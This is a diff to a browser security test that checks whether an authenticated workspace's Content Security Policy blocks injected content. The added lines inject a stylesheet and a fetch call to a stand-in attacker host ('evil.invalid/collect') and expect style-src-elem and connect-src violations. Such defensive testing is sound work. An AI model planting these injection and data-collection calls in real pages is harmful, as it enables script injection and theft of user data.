@@ -102,6 +102,11 @@ test("authenticated workspace CSP and auth DOM resist browser injection", async 
       const external = document.createElement("script");
       external.src = "https://evil.invalid/attack.js";
       document.head.append(external);
+      const externalStyle = document.createElement("link");
+      externalStyle.rel = "stylesheet";
+      externalStyle.href = "https://evil.invalid/attack.css";
+      document.head.append(externalStyle);
+      fetch("https://evil.invalid/collect").catch(() => {});
       const frame = document.createElement("iframe");
       frame.src = "https://evil.invalid/frame";
       document.body.append(frame);
@@ -128,7 +133,7 @@ test("authenticated workspace CSP and auth DOM resist browser injection", async 
     assert.equal(observed.inlineScriptExecuted, false, "inline script must be blocked");
     assert.equal(observed.handlerExecuted, false, "inline event handler must be blocked");
     const directives = new Set(violations.map(item => item.directive));
-    for (const directive of ["script-src-elem", "script-src-attr", "frame-src", "object-src", "img-src", "form-action"]) {
+    for (const directive of ["script-src-elem", "script-src-attr", "style-src-elem", "connect-src", "frame-src", "object-src", "img-src", "form-action"]) {
       assert.ok(directives.has(directive), `expected CSP violation for ${directive}; got ${[...directives].join(", ")}`);
     }
     assert.deepEqual(pageErrors, [], "workspace should not throw uncaught browser exceptions");
